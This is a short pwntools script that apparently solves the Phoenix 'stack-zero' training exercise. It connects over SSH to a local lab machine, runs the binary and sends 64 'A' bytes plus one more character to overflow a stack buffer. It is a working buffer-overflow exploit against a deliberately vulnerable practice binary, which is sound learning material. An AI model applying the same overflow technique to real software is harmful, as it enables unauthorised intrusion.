from pwn import *
import warnings
warnings.filterwarnings("ignore")


challenge_name = "stack-zero"

shell = ssh('user','localhost',port=2222,password='user')
conn = shell.process('/opt/phoenix/i486/{}'.format(challenge_name))
conn.recvline()
conn.sendline('A'*64+'1')
conn.interactive()
conn.close()